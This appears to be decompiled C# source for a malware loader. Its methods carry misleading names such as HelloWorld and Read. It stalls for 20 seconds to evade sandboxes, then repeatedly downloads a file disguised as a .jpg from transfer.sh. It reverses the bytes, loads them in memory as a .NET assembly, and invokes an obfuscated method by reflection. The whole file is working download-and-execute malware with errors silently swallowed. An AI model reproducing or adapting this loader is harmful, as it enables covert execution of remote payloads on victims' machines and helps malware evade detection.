using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Mpnro;

internal class Program
{
	private static byte[] bb;

	private static List<Type> types;

	[STAThread]
	private static void Main(string[] args)
	{
		if (Writing())
		{
			Console.WriteLine(DateTime.Now);
			YamenReader();
			HelloWorld();
			Read();
			OverWrite();
		}
	}

	private static bool Writing()
	{
		try
		{
			try
			{
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			}
			catch
			{
			}
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			double totalSeconds = TimeSpan.FromSeconds(20.0).TotalSeconds;
			while (stopwatch.Elapsed.TotalSeconds < totalSeconds)
			{
				typeof(Thread).GetMethod("Sleep", new Type[1] { typeof(int) })!.Invoke(null, new object[1] { 10 });
			}
			stopwatch.Stop();
			return true;
		}
		catch
		{
		}
		return false;
	}

	private static void YamenReader()
	{
		while (bb == null)
		{
			try
			{
				bb = new BinaryReader(WebRequest.Create("http://transfer.sh/get/1KEmBC/Odhxu.jpg").GetResponse().GetResponseStream()).ReadBytes(88561519);
			}
			catch
			{
			}
		}
	}

	private static void HelloWorld()
	{
		if (bb != null)
		{
			Array.Reverse((Array)bb, 0, bb.Length);
			AppDomain.CurrentDomain.Load(bb);
		}
	}

	private static void Read()
	{
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			Type[] array = assembly.GetTypes();
			foreach (Type type in array)
			{
				if (type.FullName == "Xgoxdxcflavbkt.Fdwgjpdelve")
				{
					types = new List<Type>();
					types.AddRange(assembly.GetTypes());
					break;
				}
			}
		}
	}

	private static void OverWrite()
	{
		if (types.Count <= 0)
		{
			return;
		}
		bb = null;
		GC.Collect();
		foreach (Type item in types.ToList())
		{
			MethodInfo[] methods = item.GetMethods();
			foreach (MethodInfo methodInfo in methods)
			{
				if (methodInfo.Name == "Flvjcsavbswyhmut")
				{
					Console.WriteLine((bool)methodInfo.Invoke(null, null));
				}
			}
		}
	}
}
